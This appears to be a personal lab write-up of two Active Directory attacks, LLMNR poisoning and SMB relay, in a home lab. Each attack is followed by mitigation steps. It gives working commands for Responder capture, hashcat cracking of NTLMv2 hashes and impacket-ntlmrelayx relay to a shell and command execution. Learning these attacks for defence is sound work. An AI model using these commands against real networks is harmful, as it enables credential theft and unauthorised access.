Setup win2022 server: 192.168.64.138   
Setup Peterparker: \\192.168.64.140  
Setup Frankcastle: 192.168.64.139  
Kali: \\192.168.64.129/24

## 🚩 LLMNR Poisoning - Link Local Multicast resolution

**Requirements:**  
* LLMNR attack can be performed if the LLMNR/NBT-NS is enabled and the attacker machine is in the same network as the target.
* LLMNR attacks use the Responder tool which captures credentials that are broadcasted over the network when a user seek connection to a another service / resource that does not exists or is poorly configured. Through these vulnerabilities, Responder spoofs the request and responds by stating they know the service or resource. Requesting the victims NTLM hash.  

![image](https://github.com/user-attachments/assets/fc6902c4-acf7-4787-b2c8-607a7cd2900b)  

Commonly used tooling for LLMNR Poisoning attacks:  
Responder, Impacket, MITM6

### Capturing Hashes with Responder

Kali responder IP: 192.168.64.129/24
sudo responder -I eth0 -dwv

![image](https://github.com/user-attachments/assets/8de5ddb4-8956-4b4b-98f6-c2df1cb6ac99)  

Ensure details such as nic, responder ip, is all correct. Once responder is on the network and listening for traffic, an example of captured NTLMv2 hashes can be seen like this:

![image](https://github.com/user-attachments/assets/f4e41ca4-5d90-4b66-b181-399742def06f)

### Cracking NTLM hashes  

root@kali:/home/kali# hashcat -m 5600 ntlm.txt /usr/share/wordlists/rockyou.txt --force

![image](https://github.com/user-attachments/assets/7d5a47ce-1ef8-4cb6-9e7d-b8785a930da5)

Hash cracked.

## 🔵 LLMNR Poisoning Mitigation  

1. Disable LLMNR / NBT-NS (NetBIOS) Broadcasts.  
2. Implement NAC on the internal network.
3. Have strong password requirements for end users espicially admin or service accounts. This will also add to defense in depth.

## 🚩SMB Relay Attack - Service Message Block

SMB (Server Message Block) is a protocol used for file shares, printers, and other resources on a network. This common protocol can be abused when an attacker on the same internal network (domain and or subdomain) is actively attempting to capture the NTLM hashes transmitted over the network. Which is then maliciously relayed to a service / server, granting access since the hash is authenticated.

**Requirements:**  
* SMB signing must be disabled or not enforced on the target machine.  
* Target machine should be admin, domain admin or service accounts for maximum effect.
* Responder config files /etc/responsder/Responder.conf must have smb and https turned off, so that captured hashes are not stored but are instead 'relayed'.

![image](https://github.com/user-attachments/assets/d8f8f9fc-6393-4e74-877a-9a0a0731cc97)  

🔴 The reason why these are turned off is to prevent the authentication resposne from being captured, but rather we are attempting to 'relay' them to our targets lists.


1. Firstly identify hosts without SMB signing. 

            nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24 -Pn 
      
![image](https://github.com/user-attachments/assets/52f6904d-f256-467c-9b40-414b011f57c2)

2. Once we have discovered our targets (have SMB signing disabled and not required). Create a targets.txt detailing the targets.

            nano target.txt > add target ips into file

3. Start responsder with the new edited config files.

            responder -I eth0 -dPv

5. Start ntlmrelayx.py or impacket-ntlmrelax.

            impacket-ntlmrelax -tf targets.txt -smb2support

![image](https://github.com/user-attachments/assets/ac597d69-e6d9-4da3-affa-ca352ce13850)

We have succesfully captured the NTLM hash from frankcastle with Responder and also relayed it back to the server using impacket-ntlmrelayx 

6. Gaining interactive shell with impacket.

            impacket-ntlmrelayx -tf targets.txt -smb2support -i  

![image](https://github.com/user-attachments/assets/dff22fbf-f7e3-4415-bb76-c1f9a7c42541)

Once interactive shell has been obtained as seen above, we can now bind this with netcat via the SMB shell TCP on 127.0.0.1:11000  
Once netcat has been binded to list all the available arguments that is available to be used in this specific shell environment.  

![image](https://github.com/user-attachments/assets/5ea73547-920d-4d1d-8ce7-085dadedbfc1)

7. Using command switch with impacket. 

            impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

![image](https://github.com/user-attachments/assets/0bda36ba-980a-444a-ad6d-de4fa828981a)

SMB relay attack with -c 'whoami' flag successful

## 🔵 SMB Relay attack Mitigations

1. Enable SMB Signing on all devices.
2. Accounting Tiering (limiting specific accounts to defined tasks).
3. Local admin restriction.
4. Disable NTLM authentication (completely stops the attack however if Kerberos fails, it cannot default to NTLM authentication).


------- 
**Reference:**  

https://medium.com/@tayyabanoor1201/tcm-security-smb-relay-attack-writeup-dfc7cc113bb0

https://medium.com/@rymak/smb-relay-attack-19192e1d158c
